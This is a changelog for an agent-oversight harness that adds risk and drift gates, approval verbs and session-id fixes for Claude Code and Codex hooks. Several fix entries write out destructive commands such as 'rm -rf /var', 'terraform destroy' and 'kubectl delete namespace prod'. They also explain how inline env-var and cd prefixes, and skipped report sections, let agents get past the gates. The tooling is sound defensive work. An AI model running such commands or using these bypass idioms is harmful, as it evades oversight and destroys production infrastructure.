**Headline: harness ships a new opt-in `runtime-reality` PreToolUse hook that blocks destructive runtime commands (compose mutations, `systemctl`, `kill`, deploy scripts) when the live process state has drifted from the documented expectations**, so an agent can no longer "fix" a half-down stack against a runtime model that no longer matches reality. Also in this release: the Risk Gate now recognizes benign `harness` meta-commands (preflight and friends) as a low-severity floor, closing a deadlock where a `gate-prod-destructive` policy hard-denied the very preflight that require-preflight-evidence demands. **Operator action**: none required, back-compat. The runtime-reality hook is opt-in (declare it in `hooks[]`, see [`docs/runtime-reality-hook.md`](docs/runtime-reality-hook.md)). Re-run `npm i -g @lannguyensi/harness` to upgrade.

### Added

- **`harness pack hook runtime-reality`: a PreToolUse drift gate** (task f0443948, agent-grounding Phase 1 Schritt 3). Wires [`@lannguyensi/runtime-reality-checker`](https://github.com/LanNguyenSi/agent-grounding/tree/master/packages/runtime-reality-checker) as a real, blocking PreToolUse hook. Before a destructive runtime command (compose `up`/`down`/`restart`/`stop`/`kill`/`rm`, `systemctl`, `kill`/`pkill`, `./deploy-*`), the hook runs an operator-configured `RUNTIME_REALITY_PROBE_CMD`, compares the live process state against the `RUNTIME_REALITY_KEYWORD` expectations file, and denies the call on critical drift (an expected process is not running). The package's own bin ships with `probe: null` and always allows; this verb is the harness-side half that injects a host-coupled subprocess probe, keeping host coupling out of agent-grounding by design. A Docker probe ships at `scripts/runtime-reality-docker-probe.mjs`. Fail-open on any load or probe error: a misconfigured probe never tarpits the session, the only deny path is a probe that actually produced state showing critical drift. v1 resolves the keyword from `RUNTIME_REALITY_KEYWORD` only; grounding-mcp session lookup, multi-keyword merge, probe caching, and a JSONL audit trail are follow-ups. See [`docs/runtime-reality-hook.md`](docs/runtime-reality-hook.md).

### Changed

- **Recipe B in `docs/writing-custom-policies.md` now surfaces the slop-detector `ui-slop` pack** (#265). agent-dx PR #40 shipped the ui-slop v1 pack, bringing slop-detector to five packs total; the recipe writeup and YAML example now list the full pack set and the `--pack` filter flag.

### Fixed

- **Risk Gate recognizes benign `harness` meta-commands as a low-severity floor** (#266, friction-log #35). `harness preflight` and the other read-only / gate-producer subcommands were unclassified, so the "unknown is not safe" fail-close let a `gate-prod-destructive` policy (`severity_at_least: critical` + `environment.name: production`) hard-deny them on a main/release branch, a deadlock against require-preflight-evidence (which demands the very command being denied). `classifyRisk` now folds in a built-in low-severity floor for harness's own benign subcommands, composed by highest-severity-wins: a dangerous tail (`harness preflight && rm -rf /var`) still classifies critical, and operator patterns can only raise severity above the floor. The match is anchored at the command head, so mutating subcommands (`apply`, `init`, `remove`, `uninstall`) stay classifiable. Covers all three `classifyRisk` call sites (runtime intercept plus the `test-risk` and `explain-policy` debug verbs).

- **`$CLAUDE_CODE_SESSION_ID` is now read everywhere `$CLAUDE_SESSION_ID` is read** (task 6562b9f6, follow-up to 058b31a3). Claude Code exports `$CLAUDE_CODE_SESSION_ID`, not `$CLAUDE_SESSION_ID`. Task 058b31a3 fixed the two `harness approve` verbs; this sweep covers every remaining read in `src/`: the shared `resolveSessionId` / `resolveReadSessionId` resolvers (consumed by `harness audit` and `harness explain --trace`), `harness policy intercept`'s `${SESSION_ID}` builtin fallback, the `pre-tool-use` / `post-tool-use` / `branch-protection` Claude pack hooks, the `codex-pre-tool-use` / `codex-stop` Codex pack hooks, and the `session-start` / `session-start branch-check` env-tag classification. Each site now reads `$CLAUDE_CODE_SESSION_ID` first, then falls back to `$CLAUDE_SESSION_ID` (and, on Codex hooks, after `$CODEX_SESSION_ID`). Tests added for each site to lock in the new precedence and the preserved legacy behaviour. `harness pause` / `harness resume` also now refuse to run when any of `$CLAUDE_CODE_SESSION_ID`, `$CLAUDE_SESSION_ID`, or `$CODEX_SESSION_ID` is set, so the operator-only guardrail fires from inside Claude Code (previously inert) and Codex agent shells too. `docs/for-humans.md` updated to name the canonical var.

## [0.30.1] - 2026-05-26

**Headline: hotfix, Risk Gate environment resolver now sees inline `VAR=value` env and leading `cd <path> &&` prefixes in Bash commands, so two common POSIX idioms no longer silently bypass production signals.** Dogfood on 2026-05-26 reproduced the leak: `DATABASE_URL=postgres://prod-host/x terraform destroy` and `cd /repos/prod-infra && terraform destroy` both ran through the gate without firing, even though either signal should have resolved `environment.name: production`. The hook intercept read `process.env` and the hook's starting cwd, neither of which reflects what the operator actually typed. v0.30.1 parses the leading command prefix and merges the result into the resolver's view of env + git context; the rest of the harness (`${REPO}`, `${BRANCH}`, `${CWD}` builtins, audit, the four-way decision matrix) is untouched. **Operator action**: none required; back-compat. Existing manifests, classifiers, and resolvers keep working byte-for-byte. Re-run `npm i -g @lannguyensi/harness` to upgrade.

### Fixed

- **Risk Gate resolver now sees inline `VAR=value` env in Bash commands** (task 1a8a103d). The intercept parses leading `\w+=value` tokens from `tool_input.command` (unquoted, single-quoted, and double-quoted values supported; no `$` interpolation in v1) and merges them over `process.env` for the environment resolver's `env_var_patterns` check. POSIX semantics, inline-env wins over process-env, matching how a real Bash subshell would set them. Closes the leak where `DATABASE_URL=postgres://prod-host/db terraform destroy` smuggled a prod signal past the gate.

- **Risk Gate resolver now sees a leading `cd <path> &&` prefix in Bash commands** (task 1a8a103d). The intercept parses a single leading `cd <path> [&&|;] ...` from `tool_input.command` and re-resolves the git context against the cd target so the branch resolver's `branch_patterns` check evaluates the destination repo, not the hook's starting cwd. Absolute and relative paths are supported, a non-existent or non-git target falls through silently to the hook's cwd. `pushd`, subshell `(cd X && ...)`, and `bash -c "..."` are intentionally out of scope in v1. Closes the leak where `cd /repos/prod-infra && terraform destroy` was evaluated against an unrelated feature branch.

### Added

- **`harness doctor` Risk Gate section names the new resolver behavior** so the next "why didn't the gate fire?" debugging session does not have to grep the source: `ℹ resolver reads inline VAR=value env + leading cd <path> && from Bash commands`.

## [0.30.0] - 2026-05-25

**Headline: `harness approve risk` grows a `--force <reason>` flag so the operator can clear a deny-tier Risk Gate block without ever touching the ledger directly.** Closes the operator-UX leak surfaced during the v0.29.0 release-cut: the built-in `gate-prod-destructive` policy is `deny`-tier and requires the `risk-override:${SESSION_ID}` ledger tag, but no CLI verb wrote that tag. Its `ux.run` instruction told operators to "record a risk-override entry in the evidence ledger", leaking the ledger as an implementation detail. The new flag mirrors the `approve understanding --force` pattern PR #253 shipped: a one-line operator command with an audit-trail suffix. The built-in policy template's `ux.run` now names the verb, not the tag. **Operator action**: none required; back-compat. The default `harness approve risk` (no flag) is byte-for-byte unchanged. Re-run `npm i -g @lannguyensi/harness` to upgrade.

### Added

- **`harness approve risk --force <reason>`** (#258, task a48ccd55). Writes `risk-override:${SESSION_ID}:forced:<sanitised-reason>` to the evidence ledger so the deny-tier `gate-prod-destructive` policy's requires clears. The `:forced:<reason>` suffix is additive metadata so `harness audit` can grep `:forced:` to surface every operator-deliberate override. The TTY guard mirrors `harness pause`: non-TTY stdin refuses with `EX_USAGE` unless `--i-am-the-operator` is passed. Agent-shell (`$CLAUDE_SESSION_ID` set) is intentionally NOT refused; the verb is designed to be runnable from `!`-prefixed Claude Code shells and reads `$CLAUDE_CODE_SESSION_ID` as a session-id resolution tier. Reason sanitisation: lowercase, keeps `[a-z0-9._-]`, collapses other runs to `-`, trims edges, caps at 64 chars; an empty-after-sanitisation result falls back to `operator-override` so the tag is never malformed. The built-in `gate-prod-destructive.ux.run` instruction (and the worked example in `docs/examples/full-manifest.yaml` plus its byte-equivalent golden) is rewritten: no more "record a risk-override entry in the evidence ledger", it now names `harness approve risk --force <reason>` for the per-block override and `harness pause --for <duration>` for the session-wide kill switch. `harness approve risk` without `--force` is byte-for-byte unchanged. Covered by 10 new tests in `tests/cli/approve-risk.test.ts`.

## [0.29.0] - 2026-05-25

**Headline: Codex hook diagnostics get sharp, `harness approve understanding` actually enforces the Prior Art rule, and read-only Codex shell commands stop tripping the Understanding Gate.** Three feats + three fixes tighten the operator surface around the Codex adapter and the approve verb. The Codex `harness policy intercept` projection now floors at a 2s timeout (PR #255), self-identifies via `--hook <name>` in the projected command + `[hook=<name>]`-prefixed stderr (PR #256), and resolves the per-call workdir for git-context builtins (PR #254). The Understanding Gate now lets read-only Codex shell commands through (PR #252) and `harness approve understanding` validates the persisted report before writing the marker, refusing reports with missing / empty / literal-`- None` `Prior Art` sections (PR #253). The `harness approve` env-var resolution chain is also fixed to read `$CLAUDE_CODE_SESSION_ID` (PR #251). **Operator action**: none required; all changes are back-compat. After upgrade, regenerate Codex config via `harness apply --runtime codex` to pick up the new `--hook` flags and 2s timeout floor in the projected `~/.codex/config.toml`. Re-run `npm i -g @lannguyensi/harness` to upgrade.

### Added

- **`harness policy intercept` self-identifies in Codex via `--hook <name>`** (#256, task 16683705). The Codex generator (`generate-codex-config.ts`) now appends ` --hook <name>` to every projected `harness policy intercept` command so each spawned process is identifiable from `ps`, audit logs, and any error string that echoes the command line. The intercept entrypoint (`policy/intercept.ts`) accepts the new flag via a commander option and prefixes every stderr emission with `[hook=<name>]`: no-match hint, verbose decision diagnostic, malformed-event JSON error, manifest-load failure, audit-write failure. Unsafe hook names (whitespace, shell metachars) silently skip the flag (`SAFE_HOOK_NAME_RE` is `[A-Za-z0-9._:-]+`, which excludes every POSIX shell active token) and fall back to the un-tagged emission. The Claude Code projection (`generate-settings.ts`) is deliberately NOT changed: that generator dedupes by `(command, timeout)` within each matcher group, so per-hook flag injection would diverge the dedupe key and N-multiply ledger queries plus audit writes per tool event. Codex has no such dedupe so the change is safe there. Back-compat: invocations without `--hook` (operator probes, smoke scripts, pre-0.29.0 installed configs) keep the un-tagged stderr format. Covered by 3 new tests in `tests/cli/apply/generate-codex-config.test.ts` (positive injection, non-policy bypass, unsafe-name skip) and 6 new tests in `tests/runtime/intercept-cli.test.ts` (tag in no-match / verbose / malformed-JSON / manifest-load / audit-write paths, plus back-compat untagged path).

- **`harness approve understanding` validates the persisted Understanding Report before writing the marker** (#253, task 2947c2a9). A `grill_me` report with missing, empty, or literal-`- None` `priorArt` is now refused before the canonical `.approvals/<sessionId>` marker is written, the ledger entry is appended, or the report is flipped from `pending` to `approved`. `fast_confirm` reports skip the check (the relaxed schema variant intentionally drops `priorArt` from `required`); legacy reports without a `mode` field pass through unchanged so the v0.4.0 schema bump doesn't retroactively invalidate historical reports. A new `--force` flag bypasses the check for emergency unblock; the ledger tag is stamped `understanding-approved:<session>:forced:<field>` so audit can distinguish forced approvals from clean ones, and the CLI prints a `validation:` line on stdout so a forced approval is visible at the call site. Closes a gap found via dogfood on 2026-05-24: the prompt declared Section 10 (Prior Art) required since `@lannguyensi/understanding-gate@0.4.0` BREAKING, but no operator-side path enforced it, so an agent could skip the section and still get the gate open. Covered by 11 new tests in `tests/cli/approve-understanding.test.ts`.

- **Read-only Codex shell commands skip the Understanding Gate pre-tool-use blocker** (#252, task c0e67c14). The Codex variant of the `understanding-before-execution` pack pre-tool-use hook (`src/cli/pack/hook-codex-pre-tool-use.ts`) now reuses the existing read-only Bash classifier (introduced for the Claude side in PR #242) to allow read-only shell commands (`git status`, `git log`, `git diff`, `ls`, `pwd`, `cat`, `grep`, `find`, etc.) through without an approved report. Mutating commands, shell-chained commands, and `apply_patch` still hard-block. Codex shell extraction reads `raw_input.command`, `raw_input.cmd`, and raw string payloads, failing closed on conflicting aliases. Closes the Codex-side gap left by PR #242, which only treated the Claude pre-tool-use blocker. Covered by `tests/cli/pack-hook-codex-pre-tool-use.test.ts` and `tests/cli/pack-read-only-bash.test.ts`.

### Fixed

- **Codex `harness policy intercept` hooks float at a 2s timeout floor** (#255, task 25dec529). The Codex generator (`generate-codex-config.ts`) now projects every `harness policy intercept` hook with `Math.max(2, ceil(budget_ms / 1000))` instead of `Math.max(1, ceil(...))`, so the Full-template policy-intercept hooks with `budget_ms: 1000` (`require-preflight-evidence`, `require-preflight-push-evidence`) get `timeout = 2` instead of `timeout = 1` in the emitted `~/.codex/config.toml`. The 1s floor was too tight under Codex's cold-start path (manifest load, git-context resolution, ledger query, risk/env evaluation, process startup), so the gates surfaced spurious `PreToolUse hook (failed) error: hook timed out after 1s` errors on routine Bash. Non-policy hooks with `budget_ms: 1000` still floor at `timeout = 1` (the bump is scoped via exact-match `h.command.trim() === "harness policy intercept"`). Each generated `[[hooks.*]]` block now also carries a `# harness hook: <name> (budget_ms=N)` comment so an operator opening `~/.codex/config.toml` can identify the source hook. Operators must re-run `harness apply --runtime codex --install` to pick up the floor for an existing install. Covered by regressions in `tests/cli/apply/generate-codex-config.test.ts`.

- **Codex `harness policy intercept` resolves the per-call shell workdir for git-context builtins** (#254). When a Codex `exec_command` / `shell` event arrives without a top-level `event.cwd` (Codex's default for non-Bash-aliased shell tools), `harness policy intercept` now resolves the policy cwd from `event.raw_input.workdir`, then `event.tool_input.workdir`, then `event.input.workdir`, then the Codex sandbox `--command-cwd` from `/proc/1/cmdline`, before falling back to `process.cwd()`. This gives the `REPO` / `BRANCH` builtins a meaningful work tree to derive from, so per-repo and per-branch ledger tags (`preflight:${REPO}`, `preflight:${BRANCH}`) actually namespace under Codex rather than collapsing to the harness process's cwd. The git-context resolver also now rejects directory-form `.git` entries without a readable `HEAD`, so an empty parent `.git/` directory no longer becomes a fake repo with a blank `BRANCH`. Covered by new Codex workdir-extraction tests in `tests/runtime/intercept-cli.test.ts` and a directory-`.git`-fallback test in `tests/runtime/git-context.test.ts`.

- **`harness approve` reads `$CLAUDE_CODE_SESSION_ID` before legacy env vars** (#251, task 058b31a3). The env-var fallback chain on both `harness approve risk` and `harness approve understanding` previously only checked `$CLAUDE_SESSION_ID` and `$CODEX_SESSION_ID`. Claude Code exports its session id as `$CLAUDE_CODE_SESSION_ID` (not `$CLAUDE_SESSION_ID`), so an arg-less `harness approve` invoked from inside a Claude Code session never resolved via the env tier: it only worked via `--session` or the hook-staged `.pending-approval` marker. The resolver now reads `$CLAUDE_CODE_SESSION_ID` first (canonical, runtime-exported), then `$CLAUDE_SESSION_ID` (legacy / docs-name peer, back-compat), then `$CODEX_SESSION_ID`, before falling through to `.pending-approval` and (for understanding) the newest pending Understanding Report. The no-session-id error message and the `--session` option help text are rewritten to name the full chain. A new `sessionSource: "env-claude-code"` variant lets the CLI annotate `(from $CLAUDE_CODE_SESSION_ID)` in stdout so a wrong env pick is visible before it lands. Tests in `tests/cli/approve-risk.test.ts` and `tests/cli/approve-understanding.test.ts` cover each env-var path independently and assert documented precedence; hermetic env hygiene additions clear all three vars in beforeEach so an external shell's exports cannot leak into a test run.

## [0.28.1] - 2026-05-24

**Hotfix: arg-less `harness approve risk` now actually works after a Risk Gate block, and `harness doctor` warns on the misconfiguration that caused the original lockout.** Surfaced during the 0.28.0 release-cut session: a Risk Gate block fired against a routine read-only Bash probe (`--version`), and recovery via `harness approve risk` failed arg-less because the session id was never staged where the operator could read it. Two complementary fixes ship together.

### Fixed

- **Risk Gate intercept now stages `.pending-approval`** (task f1df7c2d). `harness policy intercept` (the Risk Gate's PreToolUse handler in `src/cli/policy/intercept.ts`) now calls `writePendingApproval(generatedDir, sessionId)` before emitting the block JSON whenever a `require_approval` decision is the reason for the block. Mirrors the Understanding Gate hook (`src/cli/pack/hook-pre-tool-use.ts:520-526`), which has staged the marker since task 33abc147. Result: after a Risk Gate block, an operator running arg-less `harness approve risk` resolves the session id from the marker (4-tier fallback: `--session` flag, `$CLAUDE_SESSION_ID`, `$CODEX_SESSION_ID`, `.pending-approval`), exactly as `harness approve understanding` has always worked. `deny` decisions are deliberately not staged (the verb cannot unblock a `deny`; writing a marker the verb cannot act on would lie about the block's recoverability). Three new tests in `tests/runtime/intercept-cli.test.ts` cover the positive path, the deny-skip path, and the no-session-id-on-event path.

- **`harness doctor` warns on risk-clause policies missing `environment.name` scope** (task f1df7c2d). New diagnostic in the Risk Gate section: any policy whose `when:` block declares `risk.severity_at_least` or `risk.category_in` but no `environment.name` clause now produces a warn row. Per Phase 7 #5's "unknown is not safe" rule, an unclassified envelope satisfies every risk-derived clause, so such a policy fires on EVERY Bash command rather than only the risk-bearing actions it was authored to catch (the exact misconfiguration class that caused the 0.28.0 release-cut lockout). `environment.name` is the only `when:` clause exempt from the unknown-is-not-safe rule, so the warning points the operator at it explicitly. Warn-not-error: an operator with an always-on safety net may have declared this on purpose. Three new tests in `tests/cli/doctor.test.ts` cover the `severity_at_least` path, the `category_in` path, and the `environment.name`-also-present negative case.

## [0.28.0] - 2026-05-24

**Headline: the Understanding Report contract grows a tenth section, the Claude pre-tool-use blocker stops gating read-only Bash, and the doctor surface gets four small fail-loud edges.** PR #246 is the operator-visible centrepiece: `@lannguyensi/understanding-gate@0.4.0` (on npm since 2026-05-23) requires every Understanding Report to carry a `Prior Art` section, and harness 0.28.0 floors the pack-emitted UG hooks at 0.4.0 so `harness doctor` surfaces an outdated install. PR #242 sharpens the same pack's pre-tool-use blocker so `git status`, `ls`, and friends stop demanding an approved report. Around them, four schema and config diagnostics tighten: `harness apply` now errors instead of silent-skipping on an unknown policy-pack source or builtin name (#243); per-pack `configSchema` validation rejects typos like `mode: fastConfirm` at `validate` and `doctor` time (#244); pack-level `min_version` floors warn through `doctor` when the installed bin is below the declared semver (#245); and all five `min_version` schema fields now reject malformed values (`"latest"`, `"v1.0"`, `"1.0.0-alpha"`) at parse time instead of NaN-collapsing into silent equality (#247). PR #241 makes the pack pre-tool-use silent-allow paths fail loud and adds a doctor declared-but-not-live check, and PR #248 is internal-only: doctor's `versionProbe` argv signature unifies on `readonly string[]`. **Operator action**: operators using the `understanding-before-execution` pack should pin `@lannguyensi/understanding-gate@>=0.4.0`; `harness doctor` will warn until they do. A manifest written for 0.27.0 parses identically unless it carries a malformed `min_version`, in which case `validate` now rejects it (intentional, was silently no-op before). Re-run `npm i -g @lannguyensi/harness` to upgrade.

### Added

- **Read-only Bash exception in the Claude pre-tool-use blocker** (#242, task 7146694c). The `understanding-before-execution` pack's Claude pre-tool-use hook now classifies Bash commands as read-only or mutating and allows the read-only set (`git status`, `git log`, `git diff`, `ls`, `pwd`, `cat`, `grep`, `find`, etc.) through without requiring an approved Understanding Report. Mutating commands, shell-chained commands, and Edit/Write tools still hard-block. The classifier lives in `src/cli/pack/read-only-bash.ts` and is reused by the pre-tool-use hook only on the Claude side; the Codex variant continues to gate all Bash (follow-up task `c0e67c14`). Operator effect: routine fact-gathering inside a Bash-gated session stops triggering the gate without changing the policy contract for write operations.

- **Per-pack `configSchema` validation** (#244, agent-tasks/24f97ed3). Each builtin policy pack now exports a Zod `configSchema` that names the legal `config:` keys and their value shapes. `harness validate` and `harness doctor` run the schema against the operator's `policy_packs[].config` block at lint time, so a typo (e.g. `mode: fastConfirm` instead of `mode: fast_confirm`) surfaces as a per-key error rather than getting silently dropped at runtime. Same Diagnostic shape as the rest of `validate`. Covered by per-pack schema tests and an end-to-end fixture under `tests/cli/validate.test.ts`.

- **Pack-level `min_version` floor on `harness doctor`** (#245, agent-tasks/bd154095). `policy_packs[].min_version` is a new optional field declaring the floor on the canonical package-side bin (e.g. `understanding-gate --version`). `harness doctor` runs the registered version probe and emits a `Policy Packs` warn row with `outdated: installed vX < required Y` when the installed binary is below the floor. Symmetric with the existing hook-level `min_version` probe. Missing field stays silent (legacy manifest). Warn-not-error: the pack still functions in degraded mode; only `config:` keys gated on the newer release are silently lost. Covered by `tests/policy-packs/version-check.test.ts` and a Doctor policy-packs block in `tests/cli/doctor.test.ts`.

- **Understanding Report `Prior Art` section, enforced** (#246, agent-tasks/798d7173). `@lannguyensi/understanding-gate@0.4.0+` requires every Understanding Report to carry a tenth section: `Prior Art`. The harness-side companion bumps the pack-emitted UG hooks (`memory-router-user-prompt-submit`, `understanding-gate-stop-claude`, `understanding-gate-pre-tool-use-claude` and the Codex variants) to `min_version: 0.4.0`, raises the install-wizard floor in `harness init` to match, names `Prior Art` in the `ux.run` instruction line for the solo/team/full/composer templates, and extends the schema-hint enumeration to ten sections. Operators on a pre-0.4.0 install produce reports that the older Stop-capture parser accepted silently; on 0.4.0+ the section is enforced and `harness doctor` flags an outdated install via the new floor.

- **`harness doctor` declared-but-not-live check for policy packs** (#241). New doctor section reports packs declared in the manifest whose hook outputs are not present in the generated `settings.json` (e.g. a pack declared after the last `harness apply`, or one that resolved to an empty hook set). Surfaces drift between manifest intent and the wired runtime state.

### Changed

- **`harness apply` fails loud on unknown policy-pack source / builtin name** (#243, agent-tasks/76287321). `apply` previously logged a warning and continued when `policy_packs[].source` was unrecognised or the `name` did not resolve to a known builtin. It now errors with the same Diagnostic shape as `harness validate` and refuses to write `harness.generated/`. Operators on a stale manifest that referenced a removed builtin (or a typo) get a clear stderr message naming the offending entry, instead of a silently degraded output.

- **Pack pre-tool-use silent-allow paths now fail loud** (#241). The pack pre-tool-use hooks previously fell through to allow when the policy-pack registry lookup returned no policy for the matched event (a typo or stale settings.json entry). The hook now refuses with a clear stderr message instead of allowing through, so a misconfigured pack cannot silently bypass the gate it was supposed to enforce. Affects both `src/cli/pack/hook-pre-tool-use.ts` (Claude) and `src/cli/pack/hook-codex-pre-tool-use.ts` (Codex).

- **Numeric semver pattern on every `min_version` schema field** (#247, task f37d8561). All five `min_version` fields that feed `compareNumericVersions` (`hooks[]`, `policy_packs[]`, `tools.mcp[]`, `tools.cli[]`, `memory.router`) now carry a `/^\d+(?:\.\d+){0,3}$/` regex at schema parse time. Without it, a malformed value like `"latest"`, `"v1.0"`, or `"1.0.0-alpha"` rode through the schema and then NaN-collapsed to `0` (equality) inside the comparator, so the version floor silently never fired. Per-field positive and negative coverage in `tests/schema.test.ts`. Shared `NUMERIC_VERSION_PATTERN` + `NUMERIC_VERSION_MESSAGE` constants live co-located with the comparator in `src/io/version-compare.ts`.

- **`doctor` `versionProbe` argv signature unified to `readonly string[]`** (#248, task f4771ebe). Internal-only cleanup. The pack-level `checkPolicyPackVersions` helper (PR #245) used `(cmd: readonly string[]) => string | null`, while the hook / MCP / CLI / memory-router doctor surfaces still spoke the mutable `(cmd: string[])` shape; `buildPolicyPacks` adapted with a defensive `[...cmd]` spread. The whole doctor probe surface is now uniformly `readonly string[]`, and the spread is gone. `src/cli/doctor/codex.ts` keeps its `(binary: string) => string | null` shape (a different surface, not argv). No behaviour change.

### Fixed

- **Doctor pluralisation bug: `"2 policy policies"` rendered as `"2 policies with when:"`** (#240). One-line fix in `src/cli/doctor/format.ts` for the Risk Gate section's pluraliser.

## [0.27.0] - 2026-05-22

**Headline: Phase 7, the Risk Gate, is complete.** The last two sub-tasks land together. `harness policy intercept` now reasons about the action itself: it builds an Action Envelope, classifies it against `risk.classifiers[]`, resolves the target environment against `environments.resolvers[]`, evaluates each policy's `when:` clauses, and enforces the four-way `allow / warn / require_approval / deny` decision. `deny` and `require_approval` abort the tool call before the runtime fires it; `require_approval` clears once an operator runs `harness approve risk`. The built-in `dangerous-shell` classifier and `gate-prod-destructive` policy set ship in `harness init --template full`, scoped to production so an ordinary feature-branch session is untouched. **Operator action**: none required; a manifest written for 0.26.0 parses and behaves identically (the Risk Gate is inert until a `when:`-bearing policy is declared). Re-run `npm i -g @lannguyensi/harness` to upgrade.

### Added

- **Phase 7 #6: Enforcement through `PreToolUse`, the Risk Gate exit gate** (agent-tasks/a635db86). The final Phase 7 sub-task makes the Risk Gate authoritative at the `PreToolUse` boundary. Phase 7 #5 made `harness policy intercept` *return* the four-way `allow / warn / require_approval / deny` decision; #6 makes `require_approval` actually abort the tool call (`deny` already did, via the Phase 4 deny-JSON). A `require_approval` block clears once a `risk-approved:${SESSION_ID}` evidence-ledger tag exists. A new operator verb `harness approve risk [--session <id>]` writes that tag — deliberately simpler than `harness approve understanding` (no persisted report, no filesystem marker): the Risk Gate's requires-evaluator reads the ledger, so an ordinary `ledger_add` entry is the approval. The built-in `dangerous-shell` classifier and a two-policy `gate-prod-destructive` set (deny for `critical`-severity, `require_approval` for `high`-severity destructive shell actions, both scoped to `environment.name: production`) ship in `harness init --template full` and `docs/examples/full-manifest.yaml` as the canonical worked example; they fire only when the environment resolves to production, so an ordinary feature-branch session is unaffected. `harness doctor` gains a Risk Gate section reporting wiring health (classifier / resolver / `when:`-policy counts and the inert / fail-closed misconfigurations). A hot-path ReDoS guard caps the classifier match subject at 16 KiB, since the classifier now runs operator-authored regexes on every `PreToolUse` call. `dogfood/phase7-6/run-smoke.sh` exercises all four decision outcomes plus the canonical `kubectl delete namespace prod` round-trip end-to-end against the real grounding-mcp and live ledger. Covered by `tests/cli/approve-risk.test.ts`, a ReDoS-cap block in `tests/runtime/risk-classifier.test.ts`, a Risk Gate block in `tests/cli/doctor.test.ts`, and updated four-way-decision assertions in `tests/runtime/intercept.test.ts` / `intercept-cli.test.ts`.

- **Phase 7 #5: Policy evaluation over the enriched envelope** (agent-tasks/9b0d07cc). Fifth runtime sub-task of the Risk Gate, and the one that makes `policy.when:` live. `harness policy intercept` now builds the Action Envelope (#2), classifies risk (#3), and resolves the environment (#4) before evaluating policies, then ANDs each policy's `when:` clauses onto its `trigger:` match: a policy fires only when `trigger:` AND every declared `when:` clause hold against the enriched envelope. A policy with no `when:` block matches on `trigger:` alone and is byte-for-byte unchanged — the Risk Gate enrichment is skipped entirely for a manifest that declares no `when:`-bearing policy, so every Phase 4 / 5 / 6 manifest behaves exactly as before. A new pure `evaluateWhen(when, ctx)` in `src/runtime/when-eval.ts` evaluates the four clause kinds (`risk.severity_at_least` against the ordered severity scale, `risk.category_in`, `environment.name`, `action.reversible`) and returns a per-clause breakdown for explainability. Per "unknown is not safe", an unclassified risk profile (`severity: null` / `reversible: null` / `categories: []`) satisfies every risk-derived clause, so a risk-gating policy treats a command it could not classify as risk-bearing rather than letting it slip the gate. New debug verb `harness explain-policy <policy> --event <event.json>` evaluates a hypothetical event live and shows the trigger verdict, the risk classification, the resolved environment, and a per-clause `when:` breakdown — distinct from `harness explain <policy> --trace`, which replays the last recorded decision. `harness explain --trace` is extended to surface the recorded classifier match and resolved environment alongside the existing requires evaluation. Covered by `tests/runtime/when-eval.test.ts`, new `when:` and four-way-decision blocks in `tests/runtime/intercept.test.ts`, `tests/cli/explain-policy.test.ts`, and `tests/cli/explain.test.ts`.

### Changed

- **The policy decision space is now four-way: `allow / warn / require_approval / deny`** (agent-tasks/9b0d07cc). `PolicyEnforcementSchema` gains a third value, `require_approval`, alongside `block` and `warn`. A failed `requires` evaluation now maps to its outcome by enforcement — `block` → `deny`, `warn` → `warn`, `require_approval` → `require_approval` — where the Phase 4 binary model collapsed every failed requires to `deny`. **Behaviour change**: a `warn`-enforcement policy whose `requires` fails now records `outcome: "warn"` (it previously recorded `outcome: "deny"` and relied on `enforcement: "warn"` to soften it); it still never blocks the tool call. `harness audit --outcome` and `harness explain --last --decision` accept the two new outcome values.

- **`require_approval` is now authoritative — it aborts the tool call** (agent-tasks/a635db86). Phase 7 #5 returned the `require_approval` outcome without blocking; Phase 7 #6 makes `harness policy intercept` emit the Claude Code block envelope for it, exactly as it does for `deny`. The block clears once the policy's `requires` is satisfied — for the built-in policies that is a `risk-approved:${SESSION_ID}` ledger tag written by `harness approve risk`. No manifest shipped a `require_approval` policy enabled-by-default before this release, so no existing install changes behaviour mid-air; new `harness init --template full` installs gain the `gate-prod-destructive` set (dormant outside a production environment).

## [0.26.0] - 2026-05-22

**Headline: the Risk Gate's manifest vocabulary and first four runtime stages.** Phase 7 lands the schema for risk classification and environment resolution, the Action Envelope, the static Risk Classifier, and the Context Resolver, exposed through three new read-only debug verbs (`harness explain-action`, `harness test-risk`, `harness resolve-env`). Nothing is wired into the live `policy intercept` gate yet, that is Phase 7 #5 onward, so a manifest written for 0.25.2 still parses and behaves byte-identically. Alongside the Risk Gate groundwork, `harness policy intercept` now honours the pause sentinel, closing a gap where the preflight and repository gates kept firing while harness was paused, exactly when an operator most needs the kill switch. **Operator action**: none; re-run `npm i -g @lannguyensi/harness` to upgrade.

### Added

- **Phase 7 #4: Environment resolution** (agent-tasks/0be1de5c). Third runtime sub-task of the Risk Gate. Adds the Context Resolver, the stage that reads the `environments:` schema vocabulary shipped in Phase 7 #1. A pure `resolveEnvironment(envelope, resolvers, signalInputs)` in `src/runtime/environment-resolver.ts` evaluates each `environments.resolvers[]` entry against an Action Envelope plus ambient signal inputs and returns an `EnvironmentResolution` (`{ name, confidence, signals, resolver }`). Per-signal-kind match semantics, deferred by the #1 anchor, are now defined: `branch_patterns` and `kube_namespace_patterns` are `*`-globs, `kube_context_patterns` are regexes, `env_var_patterns` are substrings of the variable's value. Signals within a resolver are OR-ed. When resolvers disagree the most-dangerous environment wins (`production > staging > dev > local`); signals from every resolver asserting the winning environment are unioned for explainability. Per "unknown is not safe", an action no resolver matches resolves to `name: "unknown"`, not a safe default. A new `src/runtime/kube-context.ts` reads `~/.kube/config` best-effort for the current context and namespace (never throws). New debug verb `harness resolve-env <event.json>` builds the envelope, resolves the environment against the manifest (`--config`), and prints the result (YAML, or `--json`). No existing behaviour changes: `harness policy intercept` is not rewired, that is Phase 7 #5. Covered by `tests/runtime/environment-resolver.test.ts`, `tests/runtime/kube-context.test.ts`, and `tests/cli/resolve-env.test.ts`.

